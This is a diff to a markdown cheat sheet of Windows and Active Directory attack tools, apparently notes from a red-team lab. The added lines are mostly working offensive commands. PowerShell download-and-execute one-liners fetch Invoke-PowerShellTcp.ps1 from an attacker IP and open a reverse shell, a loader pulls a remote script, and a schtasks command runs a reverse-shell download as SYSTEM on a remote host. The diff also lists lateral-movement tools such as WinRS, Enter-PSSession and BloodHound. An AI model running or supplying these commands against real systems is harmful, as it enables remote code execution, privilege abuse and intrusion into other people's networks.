@@ -1,4 +1,13 @@
-## Interesting Tools
+- [`Invoke-PowerShellTcp.ps1`](#-invoke-powershelltcpps1-)
+- [`Find-PSRemotingLocalAdminAccess.ps1`](#-find-psremotinglocaladminaccessps1-)
+- [`Find-WMILocalAdminAccess.ps1`](#-find-wmilocaladminaccessps1-)
+- [Enter-PSSession (cmdlet)](#enter-pssession--cmdlet-)
+- [Invoke-Command (cmdlet)](#invoke-command--cmdlet-)
+- [WinRS.exe](#winrsexe)
+- [Loader.exe](#loaderexe)
+- [Task Scheduling](#task-scheduling)
+- [BloodHound](#bloodhound)
+
 
 ### `Invoke-PowerShellTcp.ps1`
 ---
@@ -14,6 +23,11 @@ Example:
 ```powershell
 C:> . Invoke-PowerShellTcp.ps1      
 C:> Power -Reverse -IPAddress 192.168.1.1 -Port 1111
+```
+To download and run from memory, both options:
+```powershell
+C:> powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress <IP> -Port 443
+C:> powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress <IP> -Port 443
 ```
 
 ### `Find-PSRemotingLocalAdminAccess.ps1`
@@ -77,16 +91,17 @@ C:> winrs.exe -r:COMPUTER cmd
 ```
 ### Loader.exe
 ---
-
 ```powershell
-C:> Loader.exe -path http:<ip>/<file>.ps1
+C:> Loader.exe -path http://<ip>/<file>.ps1
 ```
 ### Task Scheduling
 ---
 ```powershell
-C:> schtasks /create /S dcorp-dc /SC Weekly /RU "NT Authority\SYSTEM" /TN "UserTASK" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://172.16.100.X/Invoke-PowerShellTcpEx.ps1''')'"
+# Create task to run a reverse shell
+C:> schtasks /create /S <host> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<task_name>" /TR "powershell.exe -c 'iex (New-ObjectNet.WebClient).DownloadString(''http://<IP>/Invoke-PowerShellTcpEx.ps1''')'"
 
-C:> schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "UserTASK"
+# Force task to run
+C:> schtasks /Run /S <host_fqdn> /TN "<task_name>"
 ```
 ### BloodHound
 ---
